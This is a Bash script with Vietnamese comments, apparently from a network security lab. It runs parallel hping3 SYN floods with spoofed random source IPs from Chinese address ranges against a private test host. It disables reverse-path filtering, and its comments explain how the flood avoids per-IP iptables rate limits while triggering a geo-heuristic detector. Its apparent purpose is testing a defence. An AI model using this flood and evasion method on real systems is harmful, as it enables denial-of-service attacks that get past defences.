#!/bin/bash
# =============================================================
# File: attack_sc1_botnet_v2.sh
# Chạy trên: VM attacker (10.10.1.2) trong netns legit (IP: 10.10.1.3)
# Mục đích: Bắn SYN Flood giả mạo IP ngẫu nhiên từ các dải CIDR
#           thực sự của Trung Quốc để kích hoạt GeoHeuristic.
#
# Logic khác với v1:
#   v1: 5 IP cứng → iptables rate-limit per-IP (>30/s) → LOG
#   v2: random IP trong CIDR CN → mỗi IP chỉ gửi vài packet
#       → iptables rate-limit per-IP KHÔNG trigger
#       → nhưng nhiều IP CN xuất hiện → GeoHeuristic đếm hits
#       → cần chạy trong netns legit (đã whitelist) để iptables ACCEPT
#         và IptablesTailer không thấy (không rơi DROP-DEFAULT)
#
# Quan trọng: v2 dùng cùng cơ chế như hping3_cidr.sh đã test thành công.
# Mỗi lần chạy chọn 1 IP random trong CIDR CN, flood --flood, lặp liên tục
# với nhiều tiến trình song song → đảm bảo > threshold (4 IP CN) / 5s.
# =============================================================

VICTIM_IP="10.10.2.2"
PORT=80

# Số tiến trình song song
NUM_PROCS=8

echo "[*] [ATTACKER-v2] Đang chuẩn bị Botnet (gọi hping3_cidr.sh)..."
echo "    Số tiến trình: $NUM_PROCS | Target: $VICTIM_IP:$PORT"

# Dọn dẹp hping3 cũ
pkill hping3 2>/dev/null || true
pkill -f hping3_cidr.sh 2>/dev/null || true
rm -f /tmp/sc1_botnet_v2.pids

# Tắt rp_filter để kernel chấp nhận packet với spoofed source IP
sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null 2>&1 || true
sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null 2>&1 || true

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"

for i in $(seq 1 $NUM_PROCS); do
    echo "    [+] Proc $i: Đang gọi hping3_cidr.sh..."

    # Chạy script hping3_cidr.sh trong ns6
    ip netns exec ns6 bash "$SCRIPT_DIR/hping3_cidr.sh" > /dev/null 2>&1 &

    echo $! >> /tmp/sc1_botnet_v2.pids
    # Delay nhỏ giữa các tiến trình để tránh quá tải CPU attacker ngay lập tức
    sleep 0.2
done

LAUNCHED=$(wc -l < /tmp/sc1_botnet_v2.pids 2>/dev/null || echo 0)
echo ""
echo "[*] [ATTACKER-v2] Tấn công ĐÃ KÍCH HOẠT!"
echo "    $LAUNCHED tiến trình hping3 đang bắn SYN từ các IP CN ngẫu nhiên."
echo "    PIDs lưu tại: /tmp/sc1_botnet_v2.pids"
